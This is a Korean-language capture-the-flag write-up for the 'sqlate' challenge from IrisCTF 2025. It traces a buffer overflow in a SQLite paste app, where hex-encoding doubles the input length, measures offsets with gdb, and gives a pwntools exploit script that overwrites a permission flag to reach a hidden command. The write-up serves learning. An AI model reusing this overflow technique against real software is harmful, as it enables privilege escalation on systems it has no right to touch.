# sqlate

## 문제 링크

---

https://2025.irisc.tf/challenge?id=41

[sqlate.tar](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/sqlate.tar)

## Description

---

World‘s most secure paste app.

## Environment

---

![스크린샷 2025-01-06 오후 1.11.13.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-06_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_1.11.13.png)

## 코드 분석

---

### action_sys

```visual-basic
void action_sys() {
    system("/usr/bin/cat flag");
}
```

- `flag` 를 출력해주는 함수이다.
- `action_sys` 함수를 호출하면 플래그를 얻을 수 있다.

### main

```visual-basic
int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    init_admin();
    login_anonymous();

    rc = sqlite3_open("paste.db", &db);
    if (rc) {
        fprintf(stderr, "Sqlite error: %s\n", sqlite3_errmsg(db));
        exit(EXIT_FAILURE);
    }

    rc = sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS entries(user INT, title TEXT, language TEXT, content BLOB)", NULL, 0, &errMsg);
    error_handle(SQLITE_OK);

    do {
        printf(
            "\n===== SQLate =====\n"
            "1) Create new Paste\n"
            "2) Update a Paste\n"
            "3) Show a Paste\n"
            "4) List all Pastes\n"
            "5) Login / Register\n"
            "6) Exit\n"
            "\n"
            "> "
        );

        const int c = fgetc(stdin);
        fgetc(stdin);

        switch (c) {
            case '1': {
                if (!check_permissions(permission_create)) continue;

                action_create();
                continue;
            }
            case '2': {
                if (!check_permissions(permission_update)) continue;

                action_update();
                continue;
            }
            case '3': {
                if (!check_permissions(permission_view)) continue;

                action_info();
                continue;
            }
            case '4': {
                if (!check_permissions(permission_list)) continue;

                action_list();
                continue;
            }
            case '5': {
                printf("Registration is currently closed.\n\n");
                action_login();
                continue;
            }
            case EOF:
            case '6':
                return 0;
            case '7': {
                if (!check_permissions(permission_root)) continue;

                action_sys();
                continue;
            }
            default: {
                printf("Unknown action %c!", c);
            }
        }
    } while(true);
}
```

- `1` ~ `6` 까지의 서비스는 출력해주는데, `case '7'` 의 서비스는 출력을 해주지 않는 것을 확인할 수 있다.
- `case '7'` 은 User의 `permission_root` 를 확인한 후, `action_sys()` 를 수행한다.
    - **User에 root 권한을 부여하면 플래그를 획득할 수 있다.**
- 현재 User의 권한은 `main` 에서 `login_anonymous` 가 호출되면서 설정된다.
    - `permission_create`
    - `permission_update`
    - `permission_view`
    - `permission_list`

### login_anonymous

```visual-basic
void login_anonymous() {
    current_user.userId = -1;
    current_user.flags = permission_create | permission_update | permission_view | permission_list;
    strcpy(current_user.username, "anonymous");
}
```

### user_flags

```visual-basic
enum user_flags {
    permission_create = 1<<1,
    permission_update = 1<<2,
    permission_view = 1<<3,
    permission_list = 1<<4,

    permission_login = 1<<5,
    permission_register = 1<<6,

    permission_root = 1<<8,
};
```

- 권한은 `user_flags` 라는 열거형으로 정의되어있다.
- 7개의 비트를 사용하여 7개의 권한을 관리한다.
- **`permission_root` 를 활성화하는 것이 목표이다.**

### action_login → permission_root #1

```visual-basic
void action_login() {
    // Currently only admin login
    read_to_buffer("Password?");
    unsigned long length = strlen(line_buffer);
    for (unsigned long i = 0; i < length && i < 512; i++) {
        if (line_buffer[i] != admin_password[i]) {
            printf("Wrong password!\n");
            return;
        }
    }

    strcpy(current_user.username, "admin");
    current_user.userId = 0;
    current_user.flags = 0xFFFFFFFF;
}
```

- `admin_password` 의 값을 알 수 있으면, `current_user.flags` 를 `0xFFFFFFFF` 로 만들면서, `permisson_root` 비트를 활성화 할 수 있다. → Flag 획득 가능

## Flag 획득 가능성

---

- Flag를 획득하기 위해 다음과 같은 방법들을 생각할 수 있다.
    - Stack Buffer Overflow를 이용하여 Return Address를 `action_sys` 로 변경
    - 어떠한 방법으로든 `current_user` 에 `permisson_root` 부여

### Return to action_sys

- `main.c` 에서는, 사용자에게 입력을 받을 때, `read_to_buffer` 라는 함수를 통해 입력받는다.
- `read_to_buffer` 에서는 최대 256 바이트의 입력을 받고, 해당 내용을 `line_buffer` 에 저장한다.
- 그러나 `line_buffer` 는 최대 512 바이트를 입력받을 수 있는 버퍼이므로, Stack Buffer Overflow 취약점을 이용할 수 없다.
- 따라서 Return Address를 `action_sys` 로 변경하는 것은 불가능하다.

```visual-basic
char line_buffer[512];

...

void read_to_buffer(const char* description) {
    printf("Enter %s: ", description);
    fgets(line_buffer, 256, stdin);
}
```

### permission_root #1

- `admin_password` 의 값을 알아낼 수 있으면, `current_user.flags` 를 `0xFFFFFFFF` 로 설정할 수 있었다.
- `admin_password` 는 `init_admin` 에서 설정해준다.

```visual-basic
#define DEBUG false

...

void init_admin() {
    FILE* rng = fopen("/dev/urandom", "r");
    if (rng == NULL)
        errx(EXIT_FAILURE, "Failed to open /dev/urandom");
    char* result = fgets(line_buffer, 100 * sizeof(char), rng);
    if (result == NULL)
        errx(EXIT_FAILURE, "Failed to read from /dev/urandom");
    char* pass = base64_encode(line_buffer);
    strcpy(admin_password, pass);
    free(pass);
    if (DEBUG) {
        printf("Generated random admin password: %s\n", admin_password);
    }
}
```

- `DEBUG` 은 `#define` 으로 정의되어있는 변수이고, 그 값은 `false` 이다.
    - `#define` 으로 정의된 값은 프로그램 동작 과정에서 바꿀 수 없다고 한다.. 아마?
    - 따라서 `if(DEBUG)` 는 의미 없는 코드 같음..
- `/dev/urandom` 은 실행시마다 항상 랜덤한 값을 반환하는 프로그램이다.
    - 값을 예측할 수 없기 때문에, `vuln` 실행 중에 값을 알아내야한다.

- `action_login` 을 통과하여 `flag` 를 얻기 위한 방법으로 두 가지 방법이 있다.
    - `admin_password` 를 어떻게든 알아낼 수 있으면…
    - `admin_password` 을 우리가 원하는 값으로 채워넣을 수 있으면…
    - 이 방법들로는 안 풀었습니다… 가능한지 아닌지는 저도 모름

### permission_root #2 → 채택

- `current_user` 의 `permission_root` 영역을 활성화 시킬 수만 있으면 바로 `action_sys` 를 호출할 수 있다.
- `read_to_buffer` 에 취약점이 없기 때문에, 직접적인 입력으로 `permisson_root` 를 활성화 할 수는 없다.
- 그렇다면 다른 함수에서 취약점을 찾아야 하는데…
    - 다른 CTF를 풀어봤을 때, BOF 취약점은 보통 데이터를 입력하는 부분이 아니라 데이터를 **수정**하는 함수에 있었음…
    - 데이터를 수정하는 함수인 `action_update` 에서 BOF 취약점이 존재하는지 확인하였다.

### permisson_root #2 - action_update

```visual-basic
void action_update() {
    sqlite3_stmt *stmt;

    printf(
        "Which field?\n"
        "1) Language\n"
        "2) Content\n"
        "\n"
        ">"
    );

    int c = getc(stdin);
    getc(stdin);

    if (c != '1' && c != '2') return;
    const char* field = c == '1' ? "language" : "content";

    if (c == '2') {
        printf(
            "Which modifier?\n"
            "1) None\n"
            "2) Hex\n"
            "3) Base64\n"
            "\n"
            ">"
        );

        c = getc(stdin);
        getc(stdin);

        read_to_buffer(field);

        if (c == '1' || c == '3') {
            rc = sqlite3_prepare_v2(db, "UPDATE entries SET content=? WHERE title = ?", -1, &stmt, 0);
        } else if (c == '2') {
            rc = sqlite3_prepare_v2(db, "UPDATE entries SET content=HEX(?) WHERE title = ?", -1, &stmt, 0);
        } else {
            printf("Invalid choice\n");
            return;
        }

        if (c == '3') {
            char* temp = base64_encode(line_buffer);
            if (strlen(temp) > 255) err(EXIT_FAILURE, "Attempted to overflow!");
            strcpy(line_buffer, temp);
            free(temp);
        } else if (c == '2') {
            if (strlen(line_buffer) > 192) err(EXIT_FAILURE, "Attempted to overflow!");
        }
    } else {
        rc = sqlite3_prepare_v2(db, "UPDATE entries SET language=? WHERE title = ?", -1, &stmt, 0);
    }
    error_handle(SQLITE_OK);
    
    ...
    
    업데이트된 데이터를 db와 연결
    
    ...
    
  }
```

- `Content >> Base64` 로 수정하는 부분은 base64로 인코딩된 문자열의 길이가 256바이트 이상인지 확인한다.
- 그러나, `Content >> Hex` 로 수정하는 부분은 `read_to_buffer` 로 입력받은 데이터가 193바이트 이상인지만 확인한다.
    - Hex로 변환하면, 한 글자당 두 바이트로 바뀐다.
        - Ex) ‘A’ 는 0x41이므로, A → 41 로 변환되고, 크기가 두 배가 된다.
    - 따라서 192바이트의 `Content` 를 Hex로 변환하면, 384 바이트의 `Content` 가 된다.
    - **`Content` 가 저장되는 버퍼는 `paste` 구조체 내부에 있는 `content[256]` 버퍼이고, 이를 통해 스택 버퍼 오버플로우 취약점이 존재함을 알 수 있다.**

### permisson_root #2 - action_list

- `action_update` 에서 `Content` 영역에 BOF 취약점이 존재함을 확인하였다.
- `action_list` 는 `while` 문 내부에서 `strcpy(paste.content, content)` 를 이용하여 값을 복사함을 확인할 수 있다.

```visual-basic
void action_lsit() {
		
		...
		
		 while (rc == SQLITE_ROW) {
        const int rowId = sqlite3_column_int(stmt, 0);
        const char* title = (char*) sqlite3_column_text(stmt, 1);
        const char* language = (char*) sqlite3_column_text(stmt, 2);
        const char* content = (char*) sqlite3_column_text(stmt, 3);

        paste.rowId = rowId;
        strcpy(paste.title, title);
        strcpy(paste.language, language);
        strcpy(paste.content, content);

        print_paste(&paste);

        rc = sqlite3_step(stmt);
    }
    
    ...
    
 }
```

- 따라서 다음과 같은 수행을 하면 `permission_root` 비트를 활성화할 수 있다.
    - `action_update` 에서 BOF를 발생시켜 `permisson_root` 영역에 영향을 줄 만큼 충분히 큰 Content를 입력 후, Hex로 변환한다.
    - `action_list` 에서 `content` 를 `paste.content` 에 복사하여 BOF 취약점으로 `permisson_root` 비트를 활성화한다.

### permisson_root #2 - gdb 분석

- `paste.context` 와 `current_user.flags` 의 거리 차이를 계산해야한다.
    - `paste.context` 에서 BOF가 발생하더라도, `current_user.flags` 에 도달할 수 없으면 의미가 없기 때문
    - `current_user` 의 `permission_flags` 비트를 활성화하는 것이 목표

- `current_user` 의 `flag` 는 `check_permissions` 에서 사용된다.
- C코드와 어셈블리를 비교해서 확인해보면, `<check_permissions + 11>` 에서 `current_user.flags` 를 전달함을 확인할 수 있다.
- PIE 보호 기법이 적용되어있어서 프로그램 동작 시 정확한 스택의 주소는 확인할 수 없지만, 현재 `rip` 기준으로 계산된 값은 오른쪽에서 확인할 수 있다. → `0x128e28`
    - `current_user.flags` 와 `paste.context` 의 주소 차이만 확인하면 되므로, 정확한 주소는 알 필요가 없음

![스크린샷 2025-01-06 오후 3.05.00.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-06_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_3.05.00.png)

![스크린샷 2025-01-06 오후 3.05.11.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-06_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_3.05.11.png)

- `aciton_list` 에서 `while` 문 내부에서 `strcpy(paste.content, content)` 를 수행하는 부분은 `<action_list + 279>` ~ `<action_list + 296>` 이다.
- 또한, `x86_64` 의 함수 호출 규약에 따라 `paste.content` 에 해당하는 부분은 `rdi` 레지스터에 들어갈 것이므로, `rip` 를 기준으로 상대적인 위치를 계산했을 때의 주소는 `0x128d04` 이다.

![스크린샷 2025-01-06 오후 3.09.42.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-06_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_3.09.42.png)

![스크린샷 2025-01-06 오후 3.10.51.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-06_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_3.10.51.png)

- `paste.content` 와 `current_user.flags` 의 시작 주소는 `0x124` 만큼의 차이가 있다.

![스크린샷 2025-01-06 오후 3.15.09.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-06_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_3.15.09.png)

- `paste.content` 는 256 = `0x100` 바이트를 입력할 수 있는 버퍼이고, `action_update` 에서 최대 192 * 2 = 384 = `0x180` 바이트의 `Content` 를 생성할 수 있으므로, 충분히 `current_user.flags` 영역에 영향을 줄 수 있다는 것을 알 수 있다.

## 익스플로잇

---

- 위 내용을 바탕으로 작성한 `exploit.py` 이다.

```visual-basic
from pwn import *

context.log_level = 'debug'

p = process('./vuln')
# p = remote('sqlate.chal.irisc.tf', 10000)

#1 Create new Paste
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Title: ', b'iris')
p.sendlineafter(b'Language: ', b'Kor')
p.sendlineafter(b'Content: ', b'A')

#2 Update a Paste, Content -> HEX
payload = b'A' * 191
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'content: ', payload)
p.sendlineafter(b'Title: ', b'iris')

#3 List all Pastes for BOF
p.sendlineafter(b'> ', b'4')

#4 Run action_sys()
p.sendlineafter(b'> ', b'7')

print(p.recvline())
```

![스크린샷 2025-01-07 오후 3.43.32.png](sqlate%20a9360c67ccb74ad581cb859e8f30f5a3/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2025-01-07_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_3.43.32.png)